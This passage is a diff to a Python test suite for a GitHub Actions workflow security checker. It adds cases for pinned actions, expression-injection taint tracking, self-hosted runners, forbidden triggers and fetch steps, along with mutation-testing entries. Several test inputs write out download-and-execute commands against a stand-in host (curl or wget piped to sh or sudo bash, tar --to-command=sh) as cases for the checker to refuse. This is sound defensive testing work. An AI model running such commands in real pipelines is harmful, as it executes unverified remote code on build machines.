     "r5: a composite step with a tag use is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: actions/checkout@v4\n")), 1, "not pinned"),
     "r5: a composite step that downloads and executes is refused": (
-        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "downloads and executes"),
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
     "r5: a composite step with a pinned use passes": (
         _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: " + CHECKOUT_USES + "\n")), 0, ""),
     "r5: a docker action by tag is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"), 1, "runs.image"),
@@ -2711,14 +3286,85 @@ R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r5: github.ref_name in run is refused": (_r5_run("echo ${{ github.ref_name }}"), None, 1, "interpolates"),
     "r5: inputs in run is refused": (_r5_run("echo ${{ inputs.tag }}"), None, 1, "interpolates"),
     "r5: a bracketed github event in run is refused": (_r5_run("echo ${{ github['event'].x }}"), None, 1, "interpolates"),
-    "r5: a trusted expression in run passes": (_r5_run("echo ${{ github.sha }} ${{ github.event_name }} ${{ matrix.os }}"), None, 0, ""),
+    "r5: github.sha in run is refused": (_r5_run("echo ${{ github.sha }}"), None, 1, "interpolates"),
+    "r6: matrix and secrets expressions in run pass": (
+        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
+                steps="    steps:\n      - run: echo ${{ matrix.os }} ${{ secrets.TOKEN }}\n"), None, 0, ""),
     "r5: an untrusted expression in env passes": (
         _r5_job(steps="    steps:\n      - env:\n          T: ${{ github.event.pull_request.title }}\n        run: echo \"$T\"\n"), None, 0, ""),
-    "r5: curl piped to sh is refused": (_r5_run("curl -fsSL https://x.example/i.sh | sh"), None, 1, "downloads and executes"),
-    "r5: wget piped to sudo bash is refused": (_r5_run("wget -qO- https://x.example/i.sh | sudo bash"), None, 1, "downloads and executes"),
-    "r5: curl piped to python is refused": (_r5_run("curl -fsSL https://x.example/i.py | python3"), None, 1, "downloads and executes"),
-    "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "downloads and executes"),
-    "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "downloads and executes"),
+    "r6: a matrix key outside the job matrix is refused": (_r5_run("echo ${{ matrix.zz }}"), None, 1, "interpolates"),
+    "r6: a secrets path with extra segments is refused": (_r5_run("echo ${{ secrets.A.B }}"), None, 1, "interpolates"),
+    "r6: a function call in run is refused": (_r5_run("echo ${{ toJSON(secrets.A) }}"), None, 1, "interpolates"),
+    "r6: the output of a safe run step passes": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 0, ""),
+    "r6: the output of a step with an unlisted root is tainted": (
+        _r5_job(steps="    steps:\n      - id: x\n        env:\n          T: ${{ github.event.title }}\n"
+                      "        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r6: taint spreads through a step that reads a tainted output": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=$GITHUB_REF_NAME\" >> \"$GITHUB_OUTPUT\"\n"
+                      "      - id: z\n        env:\n          V: ${{ steps.x.outputs.y }}\n        run: echo \"w=$V\" >> \"$GITHUB_OUTPUT\"\n"
+                      "      - run: echo ${{ steps.z.outputs.w }}\n"), None, 1, "interpolates"),
+    "r6: the output of an unknown step is refused": (_r5_run("echo ${{ steps.nope.outputs.y }}"), None, 1, "interpolates"),
+    "r6: the output of a step id with extra segments is refused": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.outputs.y.z }}\n"), None, 1, "interpolates"),
+    "r6: the output of a sha-pinned use passes": (
+        _r5_job(steps="    steps:\n      - id: c\n        uses: " + CHECKOUT_USES + "\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 0, ""),
+    "r6: the output of a tag-pinned use is refused": (
+        _r5_job(steps="    steps:\n      - id: c\n        uses: actions/checkout@v4\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 2, "interpolates"),
+    "r6: a fetch step that runs a downloaded file is refused": (_r5_run("curl -fsSL -o f https://x.example/f && ./f"), None, 1, "fetch step"),
+    "r6: git clone then running the clone is refused": (_r5_run("git clone https://x.example/r.git x && ./x/run"), None, 1, "fetch step"),
+    "r6: a fetch step with only fetch commands passes": (
+        _r5_run("set -euo pipefail\n          curl -fsSL -o f.tgz https://x.example/f.tgz\n          echo \"abc  f.tgz\" | sha256sum -c -\n"
+                "          mkdir -p out\n          tar xzf f.tgz -C out --strip-components=1"), None, 0, ""),
+    "r6: a tar option that runs a program in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar --to-command=sh -xf f.tgz"), None, 1, "fetch step"),
+    "r6: a tar compress program in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar -I sh -xf f.tgz"), None, 1, "fetch step"),
+    "r6: a here-document in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f https://x.example/f\n          echo <<EOF\n          hi\n          EOF"), None, 1, "fetch step"),
+    "r6: a quoted fetch command is refused": (_r5_run("curl -fsSL -o f https://x.example/f\n          \"echo\" hi"), None, 1, "fetch step"),
+    "r6: an operator in a secrets expression is refused": (_r5_run("echo ${{ secrets.A || 'x' }}"), None, 1, "interpolates"),
+    "r6: a matrix path with extra segments is refused": (
+        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
+                steps="    steps:\n      - run: echo ${{ matrix.os.x }}\n"), None, 1, "interpolates"),
+    "r6: a steps path that is not outputs is refused": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.env.y }}\n"), None, 1, "interpolates"),
+    "r6: a PATH assignment in a fetch step is refused": (_r5_run("PATH=/x:$PATH curl -fsSL -o f https://x.example/f"), None, 1, "fetch step"),
+    "r6: a GITHUB_ENV write in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f https://x.example/f\n          echo X=1 >> \"$GITHUB_ENV\""), None, 1, "fetch step"),
+    "r6: a fetch step the scanner cannot read is refused": (_r5_run("curl -fsSL -o f \"https://x.example/f"), None, 1, "fetch step"),
+    "r6: a step without a fetch word may run anything": (_r5_run("python3 build.py\n          ./run-it"), None, 0, ""),
+    "r6: a fetch word in a comment does not make a fetch step": (_r5_run("# curl is not used here\n          python3 build.py"), None, 0, ""),
+    "r6: a hosted label passes": (_r5_job(head="    runs-on: ubuntu-24.04\n"), None, 0, ""),
+    "r6: a self-hosted runner is refused": (_r5_job(head="    runs-on: self-hosted\n"), None, 1, "runs-on"),
+    "r6: a runs-on expression is refused": (_r5_job(head="    runs-on: ${{ inputs.runner }}\n"), None, 1, "runs-on"),
+    "r6: a runs-on list is refused": (_r5_job(head="    runs-on: [ubuntu-latest]\n"), None, 1, "runs-on"),
+    "r6: a runs-on mapping is refused": (_r5_job(head="    runs-on:\n      group: big\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os of a hosted matrix passes": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n"), None, 0, ""),
+    "r6: runs-on matrix.os of a matrix with a self-hosted label is refused": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os without a matrix is refused": (_r5_job(head="    runs-on: ${{ matrix.os }}\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os of include entries passes": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: macos-15-intel\n"),
+        None, 0, ""),
+    "r6: runs-on matrix.os of an include entry with a self-hosted label is refused": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: self-hosted\n"),
+        None, 1, "runs-on"),
+    "r6: a workflow_call trigger is refused": ("on:\n  workflow_call:\n" + _r5_job(), None, 1, "workflow_call"),
+    "r6: a pull_request_target trigger is refused": ("on:\n  pull_request_target:\n" + _r5_job(), None, 1, "pull_request_target"),
+    "r6: a repository_dispatch trigger is refused": ("on:\n  repository_dispatch:\n" + _r5_job(), None, 1, "repository_dispatch"),
+    "r6: a forbidden trigger in a list is refused": ("on: [push, workflow_call]\n" + _r5_job(), None, 1, "workflow_call"),
+    "r6: a forbidden trigger in a block list is refused": ("on:\n  - push\n  - repository_dispatch\n" + _r5_job(), None, 1, "repository_dispatch"),
+    "r6: a push trigger passes": ("on:\n  push:\n" + _r5_job(), None, 0, ""),
+    "r6: a local action reached twice is walked once": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL),
+        _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
+    "r5: curl piped to sh is refused": (_r5_run("curl -fsSL https://x.example/i.sh | sh"), None, 1, "fetch step"),
+    "r5: wget piped to sudo bash is refused": (_r5_run("wget -qO- https://x.example/i.sh | sudo bash"), None, 1, "fetch step"),
+    "r5: curl piped to python is refused": (_r5_run("curl -fsSL https://x.example/i.py | python3"), None, 1, "fetch step"),
+    "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "fetch step"),
+    "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "fetch step"),
     "r5: a curl into a variable passes": (_r5_run("x=$(curl -fsSL https://x.example/i)"), None, 0, ""),
     "r5: a curl piped to tar or sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
     "r5: a container by tag is refused": (_r5_job(head="    container: rust:latest\n"), None, 1, "`container` image"),
@@ -2740,7 +3386,7 @@ R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r5: steps as a string are refused": (_r5_job(steps="    steps: do-it\n"), None, 1, "`steps` must be a non-empty list"),
     "r5: steps as a mapping are refused": (_r5_job(steps="    steps:\n      a: b\n"), None, 1, "`steps` must be a non-empty list"),
     "r5: steps with no value are refused": (_r5_job(steps="    steps:\n"), None, 1, "`steps` must be a non-empty list"),
-    "r5: a job with no steps is refused": (_r5_job(steps="    runs-on: x\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: a job with no steps is refused": (_r5_job(steps="    timeout-minutes: 5\n"), None, 1, "`steps` must be a non-empty list"),
     "r5: a step that is a scalar is refused": (_r5_job(steps="    steps:\n      - just\n"), None, 1, "a step must be a mapping"),
     "r5: a reusable workflow job needs no steps": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@" + "ab" * 20 + "\n", None, 0, ""),
 }
@@ -2901,7 +3547,7 @@ def self_test(root: Path) -> int:
         f"(a failing or empty declaration fails the build step and the Dockerfile RUN; "
         f"{len(CASES)} guard cases, {len(ADVISORY_CASES)} advisory cases, {len(MESSAGE_CASES)} message cases, "
         f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases, "
-        f"{len(R5_CASES)} round-5 cases, {len(JOINED_CASES)} joined cases)"
+        f"{len(R5_CASES)} round-5/6 cases, {len(JOINED_CASES)} joined cases)"
     )
     return 0
 
@@ -3061,15 +3707,35 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
     ("needs list members not typed", 'all(n.kind == "scalar" for n in needs.value)', 'True'),
     ("needs mapping allowed", 'needs.kind == "scalar" or (', 'True or ('),
     ("reusable workflow job needs steps", 'if job.get("uses") is not None and steps is None:', 'if False:'),
-    ("expression root github.event dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:head_ref|ref_name)(?![\w-])"'),
-    ("expression root github.head_ref dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|ref_name)(?![\w-])"'),
-    ("expression root github.ref_name dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|head_ref)(?![\w-])"'),
-    ("expression root github.event_name refused", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|head_ref|ref_name)"'),
-    ("expression root inputs dropped", r'|inputs(?![\w-]))", re.I)', r'|inputs_(?![\w-]))", re.I)'),
-    ("trusted expressions refused", 'if UNTRUSTED_RE.search(m.group(1)):', 'if True:'),
-    ("python pipe target dropped", r'ksh|python[0-9.]*|perl|ruby|node|php)(?![\w-])", re.I)', r'ksh|perl|ruby|node|php)(?![\w-])", re.I)'),
-    ("sudo pipe target dropped", r'\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|', r'\|\s*(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|'),
-    ("substitution needs no executor", '(SUBST_FETCH_RE.search(ln) and EXEC_WORD_RE.search(ln))', '(SUBST_FETCH_RE.search(ln))'),
+    ("expression path shape not checked", 'if not EXPR_PATH_RE.fullmatch(path):', 'if False:'),
+    ("matrix key need not be in the matrix", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return len(parts) == 2'),
+    ("matrix path length not checked", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return parts[1] in ctx.matrix'),
+    ("secrets path length not checked", 'return len(parts) == 2\n    if parts[0] == "steps":', 'return True\n    if parts[0] == "steps":'),
+    ("steps path length not checked", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return parts[2] == "outputs" and'),
+    ("steps path need not be outputs", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return len(parts) == 4 and'),
+    ("steps id need not be safe", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] not in ctx.tainted'),
+    ("steps id may be tainted", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] in ctx.safe'),
+    ("unpinned use output allowed", 'SHA_USES_RE.fullmatch(uses.text().strip())', 'True'),
+    ("tainting env refs ignored", 'TAINT_ENV_RE.search(body) or not all(', 'not all('),
+    ("tainting expressions ignored", 'or not all(expr_allowed(e, ctx) for e in step_exprs(step))', 'or False'),
+    ("taint does not spread", 'tainted.add(sid)\n                changed = True', 'tainted.add(sid)\n                changed = False'),
+    ("here-document in a fetch step allowed", 'if scan.heredocs:', 'if False:'),
+    ("dangerous assignment in a fetch step allowed", 'if DANGEROUS_ASSIGN_RE.fullmatch(name):', 'if False:'),
+    ("GITHUB_ENV write in a fetch step allowed", 'if any(FETCH_FILE_RE.search(w) for w in scan.words):', 'if False:'),
+    ("fetch command allow-list not applied", 'if not literal or word not in FETCH_ALLOWED:', 'if False:'),
+    ("fetch command may be non-literal", 'if not literal or word not in FETCH_ALLOWED:', 'if word not in FETCH_ALLOWED:'),
+    ("tar options not checked", 'if word == "tar":', 'if False:'),
+    ("tar long option not checked", 'ok = TAR_LONG_RE.fullmatch(arg) is not None', 'ok = True'),
+    ("tar first argument not checked", 'ok = arg.startswith("-") or n == 0', 'ok = True'),
+    ("git clone is not a fetch", 'clone = any(w == "git" and', 'clone = False and any(w == "git" and'),
+    ("unreadable fetch text allowed", 'return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) else ""', 'return ""'),
+    ("runs-on label list not applied", 'ok = text in HOSTED_RUNNERS', 'ok = bool(text)'),
+    ("runs-on matrix may be empty", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = all(v in HOSTED_RUNNERS for v in values)'),
+    ("runs-on matrix values not checked", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = bool(values)'),
+    ("runs-on flow list accepted", 'if ro.kind == "scalar" and ro.style == "plain" else ""', 'if ro.kind == "scalar" else ""'),
+    ("forbidden triggers allowed", 'bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]', 'bad = []'),
+    ("on: pin not compared", 'if pin is not None and json.dumps(', 'if False and json.dumps('),
+    ("local action walked more than once", 'if target in rep.walked:', 'if False:'),
     ("image digest length not pinned", r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")',
      r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]+")'),
     ("docker action digest length not pinned", r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")',
